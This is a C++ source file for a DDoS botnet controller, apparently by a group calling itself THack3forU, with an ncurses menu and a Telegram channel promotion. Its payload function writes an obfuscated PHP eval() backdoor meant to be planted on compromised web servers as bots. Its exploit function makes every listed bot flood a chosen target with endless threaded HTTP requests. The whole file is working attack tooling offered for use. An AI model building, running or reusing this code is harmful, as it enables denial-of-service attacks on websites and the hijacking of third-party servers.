#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <ncurses.h>
#include <vector>
#include <stdio.h>
#include <curl/curl.h>
#include <cstring>

using namespace std;

//g++ version 8.2.0 (Debian 8.2.0-20)


/* Made by THack3forU ) 
=======================================================
Unite and Fight!
Join to channel https://t.me/UrkaineHack,
u will find a lot of interesting things on our channel.
History remembers the truth!
U can change everything!
And make life better ;)
=======================================================
Glory Ukraine! */
string pwd = "";
ifstream bot_read;
void list_bots(){
	char *str = new char [512];
  int i=0;
  ifstream bots("servers.txt");
  while (!bots.eof())
  {
      bots.getline(str, 512, '\n');
      i++;
      cout << to_string(i) << ". " << str << endl;
      
  }

  bots.close();
  delete str;

}
ofstream bot_write;
void add_bot(){
	string bot;
	cout << "Exemple: http://site.com/payload.php" << endl;
	cout << "bot: ";
	cin >> bot;
	bot_write.open("servers.txt", ios_base::app);
	bot_write << "\n"+bot;
	bot_write.close();
	cout << "\nIf you make a mistake in text, you need to manually edit the servers.txt file!" << endl;
}
void attack(string link, string arg){
	char linkc[link.size() + 1];
	strcpy(linkc, link.c_str());
	
	char argc[arg.size() + 1];
	strcpy(argc, arg.c_str());
	
	string all = link + arg;
	
	char all_link[all.size() + 1];
	strcpy(all_link, all.c_str());
	
	while(true){
		CURL *curl;
  	CURLcode res;
  	curl_global_init(CURL_GLOBAL_ALL);
 
  
  	curl = curl_easy_init();
  	if(curl) {
	
    	curl_easy_setopt(curl, CURLOPT_URL, all_link);
    	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, argc);
    	res = curl_easy_perform(curl);
    	curl_easy_cleanup(curl);
  	}
  	curl_global_cleanup();
	}
}

ofstream payload_write;
ifstream payload_read;
void payload(){
	payload_write.open("payload.php");
	payload_write << "<?php function decode($encoded, $key){$strofsym=\"qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM=\";$x=0;while ($x++<= strlen($strofsym)) {$tmp = md5(md5($key.$strofsym[$x-1]).$key);$encoded = str_replace($tmp[1].$tmp[2].$tmp[3].$tmp[4], $strofsym[$x-1], $encoded);}return base64_decode($encoded);}eval(decode('c66971d57e2f35432fac11688d860cac46edae3846ed81d29a5542548d860cac46edc7481a27dda8ff8cc7482facfbbf071a71d5203e11681eeebba5c669525d0fddbba5c669dda8ff8cc74838a39a57071a71d5203ea61046ed71d51a27dda8ff8cc74838a34254dda842548d860cac46ed6c2242bb9b1197ff42548d860cac46ed9a5738a30cac0e71425406a4525d0e7142548d860cac46ed6c2246eddda8ff8cc74838a3fbbf071a71d5203eb44146ed1a278d860cac46ed6c222634dda8ff8cc74838a342bb071a71d5203ea61046ed1a278d860cac46ed9a5738a3dda8ff8cc7487e628d86071a71d5203ea6107e6211688d860cac46ed6c22263430eddda835430e71de74c66971d54254920fce6030ed42bb30ed97ff0fdd0e71525d0e7142548d860cac46edfbbf4254aefc071a71d5203eb44146ed1a278d860cac46ed6c2226349b11071a71d5203eb4411eee42548d860cac46edfbbf2facdda8ff8cc748dda8a610071a71d5203ea6101eeebba50e71de74c66971d542bb1168dda8a610263430ed97ff71d546ed9a5797ff30ed38a330ed81d28677c669aefc6bb826348d860cac46ed6c222facdda8ff8cc748dda81168071a71d5203ea61038a371d5c6696429071a71d5203eb44146ed42548d860cac46edfbbf1eee3543cebebba52fac7960ff8c71d542bb8d86dda8ae3826347e2f38a3ae381168fbbf81d28677c6696c22071a71d5203ea6107e6211688d860cac46ed6c222fac1168071a71d5203ea6107e6226348d860cac46edfbbf2fac4a0f071a71d5203ea6101eee26348d860cac46ed9a5746ed1168071a71d5203ea61046ed11688d860cac46ed6c220e713543cebebba52facde740e7142548d860cac46edc748ce60dda8ff8cc7482facfbbf071a71d5203e06a438a342548d860cac46edc748c669dda8ff8cc7489a558d86071a71d5203e06a47e6211688d860cac46ed93e41eee3543082826347e2f3543071a71d5203ea6107e6226348d860cac46ed6c2238a3dda8ff8cc74838a33543071a71d5203eb441cebe26348d860cac46ed9a5746eddda8ff8cc748dda806a4071a71d5203ea6101eee071a46eddda8ff8cc7487e62a6100e71425406a4525d0e7142548d860cac46ed9a5746eddda8ff8cc748dda8535b071a71d5203ea61046ed1a278d860cac46edfbbf2facdda8ff8cc748dda8b441071a71d5203eb44146ed26348d860cac46edfbbfce60dda8ff8cc748dda8920f071a71d5203ea6107e6235430e71de74c66971d57e2f3543071a71d5203e06a446ed11688d860cac46edae3846eddda8ff8cc7482fac9a57071a71d5203e06a41eee42548d860cac46edc7481a271eee071a71d5203e11681eeebba5c669525d0fddbba5c669dda8ff8cc74838a33543071a71d5203ea61038a326348d860cac46ed9a57c6694254071a71d5203eb4411eee9a5738a3dda8ff8cc7487e62535b071a71d5203ea6101eee8677c669ce6081d28677c669dda8ff8cc748dda8a610071a71d5203ea6101eee11688d860cac46ed6c2246eddda8ff8cc74838a342bb071a71d5203eb4411eee11688d860cac46ed6c2246eddda8ff8cc7487e620cac071a71d5203eb4411eeee7340e71de74c66971d57e2f6429ff8cbba5c669dda8ff8cc7489a55b441071a71d5203e06a47e6206a4525ddda8ff8cc7489a55bba5071a71d5203e06a41eee38398d86dda8ff8cc74838396c220e7130ed116897ff0e7142548d860cac46ed9a5738a36429071a71d5203eb4411eee26348d860cac46ed9a572634bba5071a71d5203eb441cebe1a278d860cac46ed9a572facdda8ff8cc74838a3425497ffb441203e3543071a071a06a4525d0e7142548d860cac46ed9a5746eddda8ff8cc748dda8535b38a31a278d860cac46edfbbf2facdda8ff8cc748dda8b441071a71d5203eb44146ed26348d860cac46edfbbfce60dda8ff8cc748dda8920f071a71d5203ea6107e6235430e71de74c66971d57e2f6429ff8cbba5c66971d5071a71d5203e06a47e6211688d860cac46edae3838a3dda8ff8cc7489a55bba5071a71d5203e06a41eee26348d860cac46edae3846eddda8ff8cc74838396c220e7130ed116897ff0e7142548d860cac46ed9a57c669dda8ff8cc74838a34254071a71d5203ea6107e6242548d860cac46edfbbf2634dda8ff8cc748dda8bba5071a71d5203ea61046ed42548d860cac46edfbbf4254dda8ff8cc7487e628d860e7142541168525d81d28677c669dda8ff8cc748dda8b4410e71fbbf7e2f6429ff8cbba5c66971d5071a71d5203e06a47e6211688d860cac46edae3838a3e7349a5538398d8693e40e7130ed116897ff0e7142548d860cac46ed6c222634dda8ff8cc7487e628d867e6211688d860cac46ed9a5738a3dda8ff8cc7487e620cac071a71d5203eb441cebeae389a553543071a93e406a43543071a71d5203ea6107e620fdd42bbdda8ff8cc7487e62535bce6026348d860cac46ed6c222facdda8ff8cc74838a33543071a71d5203ea6107e6211688d860cac46ed6c222faccaad0e71fbbf7e2f6429ff8cbba5c669dda8ff8cc7489a55b441071a71d5203e06a47e6211688d860cac46edae3838a3dda8ff8cc7489a55bba5071a71d5203e06a41eee26348d860cac46edae3846eddda8ff8cc74838396c220e7130ed116897ff0e7142548d860cac46edfbbf38a3dda8ff8cc74838a3fbbf071a71d5203ea61038a342548d860cac46ed9a57c669dda8ff8cc74838a33543071a71d5203eb4411eee26348d860cac46ed6c2246eddda8ff8cc74838a342540e71425406a4525d0e7142548d860cac46edfbbf64293543cebebba52fac9b11ce60a610ce60b29697ff71d5ce60796097ffc74806a43543071a71d5203ea6107e620fdd42bbdda8ff8cc7487e62535b071a71d5203eb44146ed071a2fac7960071a71d5203ea6107e6211688d860cac46ed6c222facdda8ff8cc7487e620cac0e71fbbf7e2f6429ff8cbba52fac535bdda871d538a30cac38a3a61011683543082893e406a43543071a71d5203eb4411eee42548d860cac46ed9a5738a3dda8ff8cc74838a39a57071a71d5203ea610cebe1a278d860cac46ed9a571a27dda8ff8cc748dda88d86071a71d5203ea610cebe1a278d860cac46ed6c22203e3543cebebba52facde74c66971d57e2f64296bb8b44142bb0cacdda8071af718425497ffae382fac9b117e62b4411168525d81d28677c669dda8ff8cc7487e62535b0e71fbbf7e2f64292fac06a48d8681d29a5564291a271eee383911687e2f3543071a71d5203ea610cebe26348d860cac46edfbbf1a27dda8ff8cc7489a551168071a71d5203ea610cebe1a278d860cac46ed6c22ce60dda8ff8cc7483839a610071a71d5203e06a41eee26348d860cac46ed6c2242bbdda8ff8cc74838398d86071a71d5203ea61046ed42548d860cac46edc74846eddda8ff8cc748263442bb071a71d5203ea6101eee42548d860cac46edc7484254920f071a71d5203e06a438a326348d860cac46ed93e44254dda8ff8cc7482fac9a57071a71d5203eb441cebe26348d860cac46ed6c220e713543071a93e4116835437e62071a46ed425446edfbbf2fac082838a3ae382634fbbf97ffa6102fac425487ffe734c669dda8ff8cc7487e6206a4071a71d5203eb44146ed11688d860cac1eeea6102facdda8ff8cc74846ed64290e7135436429de74c66971d57e2f6429ff8cbba5c669dda8ff8cc7489a55b44193e41a278d860cac46edae3838a3e734071a71d5203e06a41eee38398d86dda8ff8cc74838396c220e7130ed116897ff0e7130ed263442bb7e6211688d860cac46ed9a5738a3dda8ff8cc7487e620cac071a71d5203eb441cebe1a278d860cac46edfbbf9a553543071a071a06a4525d0e7142548d860cac46ed6c2238a3dda8ff8cc7487e626c22071a71d5203eb4411eee11688d860cac46ed9a571a27dda8ff8cc748dda86c22071a71d5203eb4411eee11688d860cac46edfbbf42bbdda8ff8cc748dda8920f0e71fbbf7e2f6429ff8cbba5c669dda8ff8cc7489a55b441071a71d5203e06a47e6211688d860cac46edae3838a3dda8ff8cc7489a55bba5071a71d5203e06a41eee26348d860cac46edae3846eddda8ff8cc74838396c220e7130ed116897ff0e7142548d860cac46ed6c222facdda8ff8cc7487e62535b071a71d5203eb4411eee1a278d860cac46edfbbf26340cacff8c8677c669ce6081d28677c669dda8ff8cc748dda8bba5071a71d5203ea61038a342548d860cac46ed9a5738a3dda8ff8cc7487e620cac071a71d5203ea6107e62071a1a27dda8ff8cc7487e620cac071a71d5203eb441cebee7340e71de74c669061bce601eee93e406a4c669f71893e41a2746ed97ff0e7142548d860cac46ed93e42facdda8ff8cc7482fac9a57071a71d5203e06a47e6242548d860cac46edc74846eddda8ff8cc7483839535b071a71d5203e06a41eee42548d860cac46edc7482634dda8ff8cc7487e628d86071a71d5203e11681eee1a278d860cac46edfbbfc669dda8ff8cc7487e6206a4071a71d5203e06a41eee42548d860cac46ed93e41a27dda8ff8cc7482fac3543071a71d5203ea610cebe26348d860cac46edc7481a27dda8ff8cc7489a558d86071a71d5203e06a446ed26348d860cac46ed93e44254dda8ff8cc748dda8bba50e71425406a4525d7e629a571a276c2238a393e47e6206a4071aa6102fac42547e62a610525d642938a38677203e3543071a71d5203ea61046ed1a278d860cac46ed93e442bbdda8ff8cc7482fac42bb071a71d5203eb4411eeebba50e71aefccebebba52facde74c66971d57e2f3543071a71d5203e06a446ed06a48d86dda8ff8cc7482fac9a57071a71d5203e06a41eee42548d860cac46edc7481a27dda8ff8cc7482facfbbf071a71d5203e11681eeebba5c669525d0fddbba5c669dda8ff8cc748dda806a46bb826348d860cac46ed6c22f718dda8ff8cc7487e621168071a71d5203eb441cebe1a278d860cac46ed6c2264293543071a071a06a4525d0e7142548d860cac46edfbbf64293543cebebba52fac71d593e4061b525de7349a5538398d8693e40fddbba5c669dda8ff8cc7483839a610071a71d5203ea61038a31a278d860cac46edfbbfc669dda8ff8cc748263442bb071a71d5203e06a446ed1a278d860cac46ed6c221a27dda8ff8cc7482fac6429071a71d5203eb44146ed42548d860cac46ed6c221a27dda8ff8cc748dda8a610071a71d5203ea610cebe1a278d860cac46edae382634dda8ff8cc7482fac6429071a71d5203e06a47e6211688d860cac46ed93e42facdda8ff8cc7483839bba5071a71d5203e1168cebe26348d860cac46ed6c222634dda8ff8cc74838a34254071a71d5203e06a438a38677c669ce6081d20fddc66942bbdda8a6103839a61046ed1a27525d642938a30fdd46ed4a0f38a3ae383839caad0e719a571a27dda8ff8cc7481eeebba5071a71d5203eb44146ed6c2206a4354387ff93e47e2f6429ff8cbba52facde74c66971d57e2f642997ff071ace6030ed97ff9a578d86b4416bb8a6108d86525d0828071a06a4525ddda8b4412facbba538a30fdd1a279b11071aa610ce604254ce601a27525db441dda89a571a27920fdda8ae382634bba5dda8bba5203eaefccebea61038a34a0fdda83543203e6429ff8cbba52facde74c66971d57e2f6429ff8c71d526346c2238a30fddce607e2fdda8a61038a3b296ce609a57ce60525d0828071a06a4525d1eeec7487e2f6429ff8cbba52facde740e7142548d860cac46edc748ce60dda8ff8cc7482facfbbf071a71d5203e06a438a342548d860cac46edc748c669dda8ff8cc7489a558d86071a71d5203e06a47e6211688d860cac46ed93e41eee3543082826347e2f3543071a71d5203ea61046ed42548d860cac46ed9a5746eddda8ff8cc74838a39a57071a71d5203ea6107e6242548d860cac46ed9a57c669dda8ff8cc748dda88d86071a71d5203eb4411eee11688d860cac46ed9a5738393543071a071a06a46665c6691a27525d71d52fac26342fac97ffc669061bce601eee93e406a4c669f71893e41a2746ed97ff0e7142548d860cac46ed93e438a3dda8ff8cc74838a36429071a71d5203ea6101eee42548d860cac46ed0fdd1a27dda8ff8cc7489a5506a4071a71d5203eb4411eee26348d860cac46edae382facdda8ff8cc748dda8a610071a71d5203eb4411eee26348d860cac46ed6c2238a3dda8ff8cc7487e620cac071a71d5203e06a438a326348d860cac46edae382facdda8ff8cc7482facfbbf26341a27c669dda8ff8cc7483839535b071a71d5203eb44146ed0fdd535bdda8ff8cc7482fac42540e7142541168ce60cebebba52facde74c66971d57e2f6429ff8cbba5c66971d5071a71d5203e06a47e6206a4525ddda8ff8cc7489a55bba59a5526348d860cac46edae3846ed93e40e7130ed116897ff0e7142548d860cac46ed9a571a27dda8ff8cc748dda8a610071a71d5203ea6107e6242548d860cac46ed6c224254dda8ff8cc74838a3fbbf071a71d5203eb44146ed1a278d860cac46edfbbf1a276c22071a71d5203ea61046ed3543c669ce600828071a06a4796087ffbba54254de7438a39a5742547e2f38a32634525d30ed38a3071a2fac08287e62a610525db296ce60ae382634b296ce6071d51eeecaadc6691a27525d71d52fac26342fac97ffc669061bce601eee93e406a4c669f71893e41a2746ed97ff0e7142548d860cac46ed93e42facdda8ff8cc7482fac9a57071a71d5203e06a47e6242548d860cac46edc74846ed38a3071a71d5203e06a41eee42548d860cac46edc7482634dda8ff8cc7487e628d86071a71d5203e11681eee1a278d860cac46edfbbfc669dda8ff8cc7487e6206a4071a71d5203e06a41eee42548d860cac46ed93e41a27dda8ff8cc7482fac35436bb826348d860cac46edc7481a27dda8ff8cc7489a558d86071a71d5203e06a446ed26348d860cac46ed93e44254dda8ff8cc748dda8bba50e7142541168ce60f3a1ae3838a342bb97ff71d546ed425487ff93e49b119a5797ffb441f718425497ff3543203e6429071a06a4ce601a2726341a277e2f64292fac06a48d8681d29a5564291a271eee383911687e2f3543071a71d5203e116846ed1a278d860cac46edae3838a3dda8ff8cc7482fac3543071a71d5203e06a41eee11688d860cac46ed93e44254dda8ff8cc7489a55bba5071a71d5203e06a446ed26348d860cac46edfbbf1a27dda8ff8cc7483839920f071a71d5203ea6101eee42548d860cac46edfbbf2facdda8ff8cc7489a55bba5071a71d5203e11681eee26348d860cac46edae38c669dda8ff8cc7487e62535b071a71d5203e06a41eee26348d860cac46edc7481a27dda8ff8cc7489a551168071a71d5203e1168cebe26348d860cac46ed6c220e713543071a263406a47e2fc669061bce601eee93e406a4c669f71893e41a2746ed97ff0e7142548d860cac46edfbbf4254dda8ff8cc7487e628d86071a71d5203e06a446ed26348d860cac46edfbbf42bbb441071a71d5203e116846ed42548d860cac46edc7481a270cac071a71d5203e11681eee26348d860cac46edfbbf38a3dda8ff8cc7489a556c22071a71d5203e11687e6226348d860cac46edfbbfc669dda8ff8cc7489a55535b071a71d5203eb4411eee1a278d860cac46edae382634dda8ff8cc7483839535b071a71d5203e06a438a342548d860cac46ed6c224254dda8ff8cc748dda8bba50e71425406a4aefccebeb44106a40b9e','THack3forU'));?>";
	payload_write.close();

	cout << "Build payload compiled...\n"<< "Payload save to "<< pwd.erase(0,4) <<"/payload.php" << endl;
	
	
}
vector<string> list_servers;
void exploit(){
	unsigned int thre = 1;
	cout << "Thread: ";
	cin >> thre;
	string kl = "1";
	string url = "";
	cout << "Target: ";
	cin >> url;
	cout << "The number of requests to the target from the server: ";
	cin >> kl;
	ifstream payload_read("servers.txt");
	if (!payload_read.is_open()) {
  	cout << "File could not be opened!" << endl;
		return;
	}
	string temp_servers;
	while (!payload_read.eof())
    {
        getline(payload_read, temp_servers);
        list_servers.push_back(temp_servers);
        
        
    }
		for(int i = 0; i < list_servers.size(); i++) {
				if(list_servers[i] != "" && list_servers[i] != " "){
        	string temp = list_servers[i];
        	string tempp = "?url="+url+"&kl="+kl;
        	for(int y=0;y<thre;y++){
        		thread thr(attack, temp, tempp);
						thr.detach();
					}
					cout << "Server " + list_servers[i] + " start attack\n" << endl;
				}
    }
    cout << "All servers start attack!\n" << endl;
    cout << "To stop DDoS, write stop and press enter... ";
    string a;
    cin >> a;
}

const char items[5][9] = {
    "Payload", 
    "Exploit",
    "Add bot",
    "List bot",
    "Exit",
};

int main(int argnum, char* argc[], char*argv[])
{
	system("clear");
	pwd = argv[11];
	initscr();
	start_color();
	init_pair(1, COLOR_RED, 0);
	init_pair(2, COLOR_WHITE, 0);
	init_pair(3, COLOR_BLUE, 0);
	bool menu = true;
	unsigned choice = 0;
	
	curs_set(0); 
	keypad(stdscr, true); 
	
	while ( menu )
	{
		clear();
		attron(A_BOLD);
		attron (COLOR_PAIR(3));
		printw ("%s \n", "PHP RPC exploit made by THack3forU Team v2.0\n");
		attroff (COLOR_PAIR(3));
		attron (COLOR_PAIR(1));
		
		printw ("%s \n", "Select item:");
		attroff(A_BOLD);
		attroff (COLOR_PAIR(1));
		for ( unsigned i = 0; i < 5; i++ )
		{
		
			if ( i == choice ){
			addch('[');
			attron(A_BOLD);
			attron (COLOR_PAIR(1));
			addch('*');
			attroff(A_BOLD);
			attroff (COLOR_PAIR(1));
			addch(']');
			addch(' '); }
			else{       
			addch('['); 
			addch(' '); 
			addch(']');
			addch(' '); 
			}
			printw("%s\n", items[i]);
			
		}
		attron(A_BOLD);
		attron (COLOR_PAIR(1));
		if(choice == 0){
   		printw ("%s \n", "\nGenerates PHP-RPC payload!");
  	}if(choice == 1){
   		printw ("%s \n", "\nStarts an attack on the selected site using the bots specified in servers.txt!");
  	}if(choice == 2){
   		printw ("%s \n", "\nAdds a bot to the list servers.txt.\nExample: http://site.com/payload.php");
  	}if(choice == 3){
   		printw ("%s \n", "\nList all bots. This may help find errors in the list of bots.");
  	}if(choice == 4){
   		printw ("%s \n", "\nExit...");
  	}
  	attroff(A_BOLD);
		attroff(COLOR_PAIR(1));
		switch ( getch() )
		{
			case KEY_UP:
				if ( choice )
 					choice--;
				break;
			case KEY_DOWN:
				if ( choice != 4 ) 
					choice++;
				break;
			case '\n': 
				menu = false;
				break;  
            
		}
	}
	  
	endwin();
  if(choice == 0){
  	payload();
  }if(choice == 1){
  	exploit();
  }if(choice == 2){
  	add_bot();
  }if(choice == 3){
  	list_bots();
  }if(choice == 4){
  	return 0;
  }

}
